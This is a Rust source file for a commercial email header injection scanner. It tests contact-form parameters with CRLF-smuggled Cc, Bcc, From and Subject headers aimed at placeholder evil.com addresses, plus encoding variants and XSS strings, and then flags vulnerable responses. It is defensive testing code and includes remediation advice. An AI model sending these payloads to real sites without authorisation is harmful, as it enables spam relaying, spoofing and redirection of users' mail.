// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Email Header Injection Scanner
 * Tests for email header injection vulnerabilities in contact forms
 *
 * Detects:
 * - CRLF injection in email headers (From, To, Cc, Bcc, Subject)
 * - Additional recipient injection
 * - Email spoofing via header manipulation
 * - Content-Type injection in emails
 * - Body injection attacks
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct EmailInjectionScanner {
    http_client: Arc<HttpClient>,
}

impl EmailInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for email header injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing email header injection on parameter: {}", param_name);

        // Determine payload set based on scan mode
        let payloads = match config.scan_mode.as_str() {
            "fast" => self.get_fast_payloads(),
            "normal" => self.get_normal_payloads(),
            "thorough" | "insane" => self.get_comprehensive_payloads(),
            _ => self.get_normal_payloads(),
        };

        for (payload, description, detection_type) in payloads {
            tests_run += 1;

            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param_name, urlencoding::encode(&payload))
            } else {
                format!("{}?{}={}", url, param_name, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) = self.analyze_response(
                        &response.body,
                        &response.headers,
                        &payload,
                        description,
                        detection_type,
                        &test_url,
                        param_name,
                    ) {
                        info!("Email header injection vulnerability detected: {}", description);
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, move to next parameter
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan endpoint for email header injection (general scan)
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Test common email-related parameter names
        let email_params = vec![
            "email", "mail", "from", "to", "cc", "bcc", "subject",
            "sender", "recipient", "reply_to", "replyto", "reply-to",
            "from_email", "to_email", "from_name", "to_name",
            "message", "body", "content", "text", "emailaddress",
            "email_address", "contact_email", "your_email", "youremail",
        ];

        for param in email_params {
            let (vulns, tests) = self.scan_parameter(url, param, config).await?;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // If we found a vulnerability, we can stop testing
            if !all_vulnerabilities.is_empty() && config.scan_mode.as_str() == "fast" {
                break;
            }
        }

        Ok((all_vulnerabilities, total_tests))
    }

    /// Get fast payloads (most common/effective)
    fn get_fast_payloads(&self) -> Vec<(String, &'static str, DetectionType)> {
        vec![
            // CRLF injection with Cc header
            ("test@test.com%0ACc:attacker@evil.com".to_string(),
             "CRLF Cc injection (URL encoded)", DetectionType::ResponseContent),
            ("test@test.com\r\nCc:attacker@evil.com".to_string(),
             "CRLF Cc injection (literal)", DetectionType::ResponseContent),

            // CRLF injection with Bcc header
            ("test@test.com%0ABcc:attacker@evil.com".to_string(),
             "CRLF Bcc injection (URL encoded)", DetectionType::ResponseContent),
            ("test@test.com\nBcc:attacker@evil.com".to_string(),
             "CRLF Bcc injection (newline)", DetectionType::ResponseContent),

            // Multiple recipients injection
            ("test@test.com,attacker@evil.com".to_string(),
             "Multiple recipients via comma", DetectionType::ResponseContent),
            ("test@test.com;attacker@evil.com".to_string(),
             "Multiple recipients via semicolon", DetectionType::ResponseContent),
        ]
    }

    /// Get normal payloads
    fn get_normal_payloads(&self) -> Vec<(String, &'static str, DetectionType)> {
        let mut payloads = self.get_fast_payloads();

        payloads.extend(vec![
            // Subject injection
            ("test@test.com%0ASubject:Injected Subject".to_string(),
             "Subject header injection", DetectionType::ResponseContent),
            ("valid@domain.com\r\nSubject: Spam Subject".to_string(),
             "Subject injection (literal CRLF)", DetectionType::ResponseContent),

            // From injection
            ("test@test.com%0AFrom:attacker@evil.com".to_string(),
             "From header injection", DetectionType::ResponseContent),
            ("legit@example.com\nFrom: spoof@evil.com".to_string(),
             "From spoofing via newline", DetectionType::ResponseContent),

            // Content-Type injection
            ("test@test.com%0AContent-Type:text/html".to_string(),
             "Content-Type header injection", DetectionType::ResponseContent),

            // Reply-To injection
            ("user@domain.com%0AReply-To:attacker@evil.com".to_string(),
             "Reply-To header injection", DetectionType::ResponseContent),

            // Body injection via double CRLF
            ("test@test.com%0A%0ABody injection content".to_string(),
             "Email body injection (double CRLF)", DetectionType::ResponseContent),
            ("valid@email.com\r\n\r\nInjected body text".to_string(),
             "Email body injection (literal)", DetectionType::ResponseContent),
        ]);

        payloads
    }

    /// Get comprehensive payloads (thorough/insane modes)
    fn get_comprehensive_payloads(&self) -> Vec<(String, &'static str, DetectionType)> {
        let mut payloads = self.get_normal_payloads();

        payloads.extend(vec![
            // Advanced CRLF encodings
            ("%0d%0aCc:attacker@evil.com".to_string(),
             "CRLF Cc (lowercase encoding)", DetectionType::ResponseContent),
            ("%0D%0ACc:attacker@evil.com".to_string(),
             "CRLF Cc (uppercase encoding)", DetectionType::ResponseContent),

            // Unicode CRLF variants
            ("%E5%98%8A%E5%98%8DCc:attacker@evil.com".to_string(),
             "Unicode CRLF Cc injection", DetectionType::ResponseContent),
            ("%E5%98%8D%E5%98%8ABcc:hidden@evil.com".to_string(),
             "Alternative Unicode CRLF Bcc", DetectionType::ResponseContent),

            // Null byte variants
            ("%00%0ACc:attacker@evil.com".to_string(),
             "Null byte + newline Cc injection", DetectionType::ResponseContent),
            ("test@test.com%00%0ABcc:attacker@evil.com".to_string(),
             "Null byte + CRLF Bcc injection", DetectionType::ResponseContent),

            // Multiple header injections
            ("test@test.com%0ACc:cc@evil.com%0ABcc:bcc@evil.com".to_string(),
             "Multiple header injection (Cc+Bcc)", DetectionType::ResponseContent),
            ("valid@email.com\r\nCc:cc1@evil.com\r\nCc:cc2@evil.com".to_string(),
             "Multiple Cc header injection", DetectionType::ResponseContent),

            // HTML/XSS in email body
            ("test@test.com%0A%0A<script>alert(1)</script>".to_string(),
             "XSS in email body", DetectionType::XssPattern),
            ("user@domain.com\r\n\r\n<img src=x onerror=alert(1)>".to_string(),
             "HTML injection in email body", DetectionType::XssPattern),

            // MIME boundary manipulation
            ("test@test.com%0AContent-Type:multipart/mixed;boundary=evil".to_string(),
             "MIME boundary injection", DetectionType::ResponseContent),

            // Priority/Importance header injection
            ("test@test.com%0AX-Priority:1".to_string(),
             "X-Priority header injection", DetectionType::ResponseContent),
            ("user@domain.com\r\nImportance: high".to_string(),
             "Importance header injection", DetectionType::ResponseContent),

            // Message-ID injection
            ("test@test.com%0AMessage-ID:<evil@attacker.com>".to_string(),
             "Message-ID header injection", DetectionType::ResponseContent),

            // List injection (for bulk emails)
            ("test@test.com%0AList-Unsubscribe:<http://evil.com>".to_string(),
             "List-Unsubscribe header injection", DetectionType::ResponseContent),

            // Tab as separator
            ("test@test.com%09attacker@evil.com".to_string(),
             "Tab separator for multiple recipients", DetectionType::ResponseContent),

            // Space variations
            ("test@test.com attacker@evil.com".to_string(),
             "Space separator for multiple recipients", DetectionType::ResponseContent),

            // Alternative newline representations
            ("%0atest@test.com".to_string(),
             "Single LF injection", DetectionType::ResponseContent),
            ("%0dtest@test.com".to_string(),
             "Single CR injection", DetectionType::ResponseContent),

            // Mixed encoding
            ("test@test.com%0d%0aCc:attacker@evil.com".to_string(),
             "Mixed case CRLF encoding", DetectionType::ResponseContent),
        ]);

        payloads
    }

    /// Analyze response for email injection indicators
    fn analyze_response(
        &self,
        body: &str,
        headers: &std::collections::HashMap<String, String>,
        payload: &str,
        _description: &str,
        detection_type: DetectionType,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        match detection_type {
            DetectionType::ResponseContent => {
                self.detect_email_injection_in_response(body, headers, payload, url, param_name)
            }
            DetectionType::XssPattern => {
                self.detect_xss_in_email(body, payload, url, param_name)
            }
        }
    }

    /// Detect email header injection in response
    fn detect_email_injection_in_response(
        &self,
        body: &str,
        _headers: &std::collections::HashMap<String, String>,
        payload: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        let body_lower = body.to_lowercase();

        // Common success indicators that might reveal injection
        let success_indicators = vec![
            "email sent",
            "message sent",
            "successfully sent",
            "thank you",
            "message delivered",
            "sent successfully",
            "email delivered",
            "your message has been sent",
            "we have received your message",
        ];

        // Check if response indicates email was sent
        let email_sent = success_indicators.iter().any(|indicator| body_lower.contains(indicator));

        if !email_sent {
            // If email wasn't sent, injection likely failed or was blocked
            return None;
        }

        // Check for reflection of injected headers in response (some apps show recipients)
        let injection_indicators = vec![
            ("attacker@evil.com", "Email sent to attacker address"),
            ("evil.com", "Evil domain in response"),
            ("cc:attacker", "Cc header reflected"),
            ("bcc:attacker", "Bcc header reflected"),
            ("cc:hidden", "Cc to hidden recipient"),
            ("bcc:hidden", "Bcc to hidden recipient"),
            ("injected subject", "Injected subject line"),
            ("spam subject", "Spam subject detected"),
            ("spoof@", "Spoofed sender address"),
        ];

        for (indicator, evidence_desc) in injection_indicators {
            if body_lower.contains(indicator) {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    "Email Header Injection - Reflected in response",
                    evidence_desc,
                    Confidence::High,
                ));
            }
        }

        // Check for CRLF characters in payload that might have been processed
        if payload.contains("%0A") || payload.contains("%0D") ||
           payload.contains("\r\n") || payload.contains("\n") {

            // Check for header-like patterns in response
            let header_patterns = vec![
                "cc:",
                "bcc:",
                "subject:",
                "from:",
                "reply-to:",
                "content-type:",
            ];

            for pattern in header_patterns {
                if body_lower.contains(pattern) && email_sent {
                    return Some(self.create_vulnerability(
                        url,
                        param_name,
                        payload,
                        "Potential Email Header Injection",
                        "Email sent with suspicious header pattern in response",
                        Confidence::Medium,
                    ));
                }
            }
        }

        // Check for multiple recipient patterns
        if (payload.contains(',') || payload.contains(';')) && email_sent {
            let multi_recipient_indicators = vec![
                "sent to multiple",
                "recipients:",
                "sent to:",
                "emailed to:",
                "delivered to:",
            ];

            for indicator in multi_recipient_indicators {
                if body_lower.contains(indicator) {
                    return Some(self.create_vulnerability(
                        url,
                        param_name,
                        payload,
                        "Email Header Injection - Multiple Recipients",
                        "Email appears to have been sent to multiple recipients",
                        Confidence::Medium,
                    ));
                }
            }
        }

        None
    }

    /// Detect XSS injection in email body
    fn detect_xss_in_email(
        &self,
        body: &str,
        payload: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        let body_lower = body.to_lowercase();

        // Check if script tags are reflected
        if payload.contains("<script>") && body_lower.contains("<script>") {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                "Email Header Injection with XSS",
                "Script tags injected into email body",
                Confidence::High,
            ));
        }

        // Check for img tag with onerror
        if payload.contains("onerror") && body_lower.contains("onerror") {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                "Email Header Injection with XSS",
                "Event handler injected into email body",
                Confidence::High,
            ));
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        confidence: Confidence,
    ) -> Vulnerability {
        let verified = matches!(confidence, Confidence::High);

        // Severity depends on what can be injected
        let severity = if description.contains("XSS") {
            Severity::High
        } else if confidence == Confidence::High {
            Severity::High
        } else {
            Severity::Medium
        };

        Vulnerability {
            id: format!("email_injection_{}", uuid::Uuid::new_v4()),
            vuln_type: "Email Header Injection".to_string(),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Email header injection vulnerability in parameter '{}': {}",
                param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-93".to_string(), // CRLF Injection
            cvss: if severity == Severity::High { 8.1 } else { 6.5 },
            verified,
            false_positive: false,
            remediation: r#"1. Sanitize all CRLF characters (\r\n, %0d%0a, %0a, %0d) from email inputs
2. Validate email addresses using strict RFC-compliant regex
3. Use email library functions for setting headers (don't concatenate raw strings)
4. Implement allowlists for email domains if possible
5. Reject inputs containing multiple email addresses (if not intended)
6. Strip or encode special characters: < > , ; : \r \n %0d %0a
7. Use parameterized email functions provided by your framework
8. Validate Subject, From, To, Cc, Bcc fields separately
9. Implement rate limiting on email sending endpoints
10. Log all email sending attempts for security monitoring"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

/// Type of detection to perform
#[derive(Debug, Clone, Copy)]
enum DetectionType {
    ResponseContent,
    XssPattern,
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> EmailInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        EmailInjectionScanner::new(http_client)
    }

    #[test]
    fn test_detect_cc_injection() {
        let scanner = create_test_scanner();
        let body = "Thank you! Your email has been sent successfully to: user@example.com, attacker@evil.com";
        let headers = std::collections::HashMap::new();
        let payload = "user@example.com%0ACc:attacker@evil.com";

        let result = scanner.detect_email_injection_in_response(
            body,
            &headers,
            payload,
            "http://example.com/contact",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.vuln_type, "Email Header Injection");
        assert_eq!(vuln.cwe, "CWE-93");
    }

    #[test]
    fn test_detect_multiple_recipients() {
        let scanner = create_test_scanner();
        let body = "Email sent successfully. Delivered to: 2 recipients";
        let headers = std::collections::HashMap::new();
        let payload = "test@test.com,attacker@evil.com";

        let result = scanner.detect_email_injection_in_response(
            body,
            &headers,
            payload,
            "http://example.com/contact",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("Multiple Recipients"));
    }

    #[test]
    fn test_detect_xss_in_email() {
        let scanner = create_test_scanner();
        let body = "Your message: <script>alert(1)</script> has been sent";
        let payload = "test@test.com%0A%0A<script>alert(1)</script>";

        let result = scanner.detect_xss_in_email(
            body,
            payload,
            "http://example.com/contact",
            "message",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("XSS"));
        assert_eq!(vuln.severity, Severity::High);
    }

    #[test]
    fn test_safe_response() {
        let scanner = create_test_scanner();
        let body = "Thank you for your message! We'll get back to you soon.";
        let headers = std::collections::HashMap::new();
        let payload = "normal@example.com";

        let result = scanner.detect_email_injection_in_response(
            body,
            &headers,
            payload,
            "http://example.com/contact",
            "email",
        );

        // Should not detect injection in normal response
        assert!(result.is_none());
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/contact",
            "email",
            "test@test.com%0ACc:attacker@evil.com",
            "Email Header Injection - Cc injection",
            "Cc header injected successfully",
            Confidence::High,
        );

        assert_eq!(vuln.vuln_type, "Email Header Injection");
        assert_eq!(vuln.severity, Severity::High);
        assert_eq!(vuln.parameter, Some("email".to_string()));
        assert_eq!(vuln.cwe, "CWE-93");
        assert!(vuln.verified);
        assert!(vuln.remediation.contains("CRLF characters"));
    }

    #[test]
    fn test_payload_count_by_mode() {
        let scanner = create_test_scanner();

        let fast = scanner.get_fast_payloads();
        let normal = scanner.get_normal_payloads();
        let comprehensive = scanner.get_comprehensive_payloads();

        assert!(fast.len() < normal.len());
        assert!(normal.len() < comprehensive.len());
        assert!(comprehensive.len() > 30); // Should have many payloads
    }
}
